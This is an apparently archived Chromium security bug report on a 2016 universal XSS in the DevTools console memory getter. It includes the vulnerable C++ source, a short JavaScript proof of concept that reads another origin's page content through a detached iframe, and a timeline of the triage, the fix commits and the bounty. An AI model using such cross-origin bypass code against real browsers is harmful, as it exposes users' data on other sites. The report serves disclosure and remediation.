# Security: Universal XSS in V8Console::memoryGetterCallback

| Field | Value |
|-------|-------|
| **Issue ID** | [40084429](https://issues.chromium.org/issues/40084429) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Platform>DevTools |
| **Reporter** | se...@gmail.com |
| **Assignee** | ko...@chromium.org |
| **Created** | 2016-05-31 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

From src/third\_party/WebKit/Source/platform/v8\_inspector/V8Console.cpp:447:  

void V8Console::memoryGetterCallback(const v8::FunctionCallbackInfo[v8::Value](javascript:void(0);)& info)  

{  

if (V8DebuggerClient\* client = ConsoleHelper(info).ensureDebuggerClient()) {  

v8::Local[v8::Value](javascript:void(0);) memoryValue;  

if (!client->memoryInfo(info.GetIsolate(), info.GetIsolate()->GetCurrentContext(), info.Holder()).ToLocal(&memoryValue))  

return;  

info.GetReturnValue().Set(memoryValue);  

}  

}

From src/third\_party/WebKit/Source/core/inspector/MainThreadDebugger.cpp:232:  

v8::MaybeLocal[v8::Value](javascript:void(0);) MainThreadDebugger::memoryInfo(v8::Isolate\* isolate, v8::Local[v8::Context](javascript:void(0);) context, v8::Local[v8::Object](javascript:void(0);) creationContext)  

{  

ExecutionContext\* executionContext = toExecutionContext(context);  

ASSERT\_UNUSED(executionContext, executionContext);  

ASSERT(executionContext->isDocument());  

return toV8(MemoryInfo::create(), creationContext, isolate);  

}

|memoryGetterCallback| is not type-checked so it accepts any object as |info.Holder()| which is then used as a creation context in |toV8|.

**VERSION**  

Google Chrome 52.0.2743.19 (Official Build) dev-m (64-bit)  

Google Chrome 53.0.2753.0 (Official Build) canary (64-bit)  

The stable and beta branches are not affected.

**REPRODUCTION CASE**

<body>
<script>
frame = document.documentElement.appendChild(document.createElement("iframe"));
frame.src = "https://www.google.com/services/";
frame.onload = function() {
loc = frame.contentWindow.location;
frame.remove();
memory = console.\_\_lookupGetter\_\_("memory").call(loc);
alert(memory.constructor.constructor("return document.body.innerHTML")());
}
</script>
</body>

We have to call |frame.remove()| in the repro case to bypass V8WrapperInstantiationScope::securityCheck.

--

I would like to remain anonymous for this report.

## Timeline

### cl...@chromium.org (2016-06-02)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5636669831380992

### fe...@chromium.org (2016-06-02)

Thank you for the report.

Marking as affecting beta because 52 is about to be promoted to beta.

### sh...@chromium.org (2016-06-03)

[Empty comment from Monorail migration]

### fe...@chromium.org (2016-06-03)

[Empty comment from Monorail migration]

[Monorail components: Infra>Client>V8]

### fe...@chromium.org (2016-06-03)

adamk@, would you be a good person to investigate this?

[Monorail components: -Infra>Client>V8 Blink>JavaScript]

### jo...@chromium.org (2016-06-03)

[Empty comment from Monorail migration]

### ad...@chromium.org (2016-06-03)

I'll give a shot at some triage today. Will likely punt to MUC/TOK for handling on Monday if I don't get very far.

### ad...@chromium.org (2016-06-03)

[Empty comment from Monorail migration]

[Monorail components: Blink>Bindings]

### ad...@chromium.org (2016-06-03)

This looks to me like a regression from https://chromium.googlesource.com/chromium/src/+/807ec9550e8a31517966636e6a5b506474ab4ea9.

Previously, console.memory used the normal bindings code generation, with a configuration that included CheckHolder. The aforementioned patch instead sets up the console object manually, and uses v8::Function::New instead of v8::FunctionTemplate. The latter allows the passing of a v8::Signature, which is what V8 uses for holder-checking. v8::Function::New doesn't seem to have support for Signatures.

### fe...@chromium.org (2016-06-03)

[Empty comment from Monorail migration]

### ad...@chromium.org (2016-06-03)

[Empty comment from Monorail migration]

[Monorail components: -Blink>Bindings -Blink>JavaScript Platform>DevTools]

### ko...@chromium.org (2016-06-03)

https://codereview.chromium.org/2034203002/

### ko...@chromium.org (2016-06-03)

[Empty comment from Monorail migration]

### dg...@chromium.org (2016-06-03)

@epertoso: I'm wondering why do we pass the security check for detached frames here: https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/bindings/core/v8/V8DOMWrapper.cpp&rcl=1464952570&l=111

Any ideas? Note that snippet above does not work without detaching the frame.

### bu...@chromium.org (2016-06-04)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/6c932f8010646f4cc13985d05e3cc75f29ea2abb

commit 6c932f8010646f4cc13985d05e3cc75f29ea2abb
Author: kozyatinskiy <kozyatinskiy@chromium.org>
Date: Sat Jun 04 01:51:51 2016

[DevTools] Improve MainThreadDebugger::memoryInfo

Use context->Global() instead of CreationContext in MainThreadDebugger::memoryInfo.

BUG=616225
R=adamk@chromium.org,dgozman@chromium.org

Review-Url: https://codereview.chromium.org/2034203002
Cr-Commit-Position: refs/heads/master@{#397887}

[add] https://crrev.com/6c932f8010646f4cc13985d05e3cc75f29ea2abb/third_party/WebKit/LayoutTests/inspector-protocol/runtime/resources/iframe.html
[add] https://crrev.com/6c932f8010646f4cc13985d05e3cc75f29ea2abb/third_party/WebKit/LayoutTests/inspector-protocol/runtime/runtime-console-memory-expected.txt
[add] https://crrev.com/6c932f8010646f4cc13985d05e3cc75f29ea2abb/third_party/WebKit/LayoutTests/inspector-protocol/runtime/runtime-console-memory.html
[modify] https://crrev.com/6c932f8010646f4cc13985d05e3cc75f29ea2abb/third_party/WebKit/Source/core/inspector/MainThreadDebugger.cpp
[modify] https://crrev.com/6c932f8010646f4cc13985d05e3cc75f29ea2abb/third_party/WebKit/Source/core/inspector/MainThreadDebugger.h
[modify] https://crrev.com/6c932f8010646f4cc13985d05e3cc75f29ea2abb/third_party/WebKit/Source/core/inspector/WorkerThreadDebugger.cpp
[modify] https://crrev.com/6c932f8010646f4cc13985d05e3cc75f29ea2abb/third_party/WebKit/Source/core/inspector/WorkerThreadDebugger.h
[modify] https://crrev.com/6c932f8010646f4cc13985d05e3cc75f29ea2abb/third_party/WebKit/Source/platform/v8_inspector/V8Console.cpp
[modify] https://crrev.com/6c932f8010646f4cc13985d05e3cc75f29ea2abb/third_party/WebKit/Source/platform/v8_inspector/public/V8DebuggerClient.h


### ko...@chromium.org (2016-06-04)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-06-04)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges.

- Your friendly ClusterFuzz

### sh...@chromium.org (2016-06-04)

[Empty comment from Monorail migration]

### ti...@google.com (2016-06-05)

Your change meets the bar and is auto-approved for M52 (branch: 2743)

### bu...@chromium.org (2016-06-05)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/4c6d33b7d6b79941dcbaf008b0e3b381fe188fa0

commit 4c6d33b7d6b79941dcbaf008b0e3b381fe188fa0
Author: Alexey Kozyatinskiy <kozyatinskiy@chromium.org>
Date: Sun Jun 05 19:25:21 2016

[DevTools] Improve MainThreadDebugger::memoryInfo

Use context->Global() instead of CreationContext in MainThreadDebugger::memoryInfo.

BUG=616225
R=adamk@chromium.org,dgozman@chromium.org

Review-Url: https://codereview.chromium.org/2034203002
Cr-Commit-Position: refs/heads/master@{#397887}
(cherry picked from commit 6c932f8010646f4cc13985d05e3cc75f29ea2abb)

Review URL: https://codereview.chromium.org/2043543002 .

Cr-Commit-Position: refs/branch-heads/2743@{#230}
Cr-Branched-From: 2b3ae3b8090361f8af5a611712fc1a5ab2de53cb-refs/heads/master@{#394939}

[add] https://crrev.com/4c6d33b7d6b79941dcbaf008b0e3b381fe188fa0/third_party/WebKit/LayoutTests/inspector-protocol/runtime/resources/iframe.html
[add] https://crrev.com/4c6d33b7d6b79941dcbaf008b0e3b381fe188fa0/third_party/WebKit/LayoutTests/inspector-protocol/runtime/runtime-console-memory-expected.txt
[add] https://crrev.com/4c6d33b7d6b79941dcbaf008b0e3b381fe188fa0/third_party/WebKit/LayoutTests/inspector-protocol/runtime/runtime-console-memory.html
[modify] https://crrev.com/4c6d33b7d6b79941dcbaf008b0e3b381fe188fa0/third_party/WebKit/Source/core/inspector/MainThreadDebugger.cpp
[modify] https://crrev.com/4c6d33b7d6b79941dcbaf008b0e3b381fe188fa0/third_party/WebKit/Source/core/inspector/MainThreadDebugger.h
[modify] https://crrev.com/4c6d33b7d6b79941dcbaf008b0e3b381fe188fa0/third_party/WebKit/Source/core/inspector/WorkerThreadDebugger.cpp
[modify] https://crrev.com/4c6d33b7d6b79941dcbaf008b0e3b381fe188fa0/third_party/WebKit/Source/core/inspector/WorkerThreadDebugger.h
[modify] https://crrev.com/4c6d33b7d6b79941dcbaf008b0e3b381fe188fa0/third_party/WebKit/Source/platform/v8_inspector/V8Console.cpp
[modify] https://crrev.com/4c6d33b7d6b79941dcbaf008b0e3b381fe188fa0/third_party/WebKit/Source/platform/v8_inspector/public/V8DebuggerClient.h


### bu...@chromium.org (2016-06-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/c0f67c5511dacb91d9484a737e162c02d9f53269

commit c0f67c5511dacb91d9484a737e162c02d9f53269
Author: jochen <jochen@chromium.org>
Date: Tue Jun 07 09:46:15 2016

Sandbox detached iframes a bit more

Disallow cross-origin wrapper creation from them

BUG=616225
R=haraken@chromium.org

Review-Url: https://codereview.chromium.org/2042743002
Cr-Commit-Position: refs/heads/master@{#398260}

[modify] https://crrev.com/c0f67c5511dacb91d9484a737e162c02d9f53269/third_party/WebKit/Source/bindings/core/v8/V8DOMWrapper.cpp


### aw...@chromium.org (2016-07-14)

[Empty comment from Monorail migration]

### oc...@chromium.org (2016-07-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-10)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2016-10-10)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-11)

$7,500 for this one!

### aw...@chromium.org (2016-10-11)

[Empty comment from Monorail migration]

### aw...@google.com (2019-02-16)

[Empty comment from Monorail migration]

### is...@google.com (2019-02-16)

This issue was migrated from crbug.com/chromium/616225?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084429)*
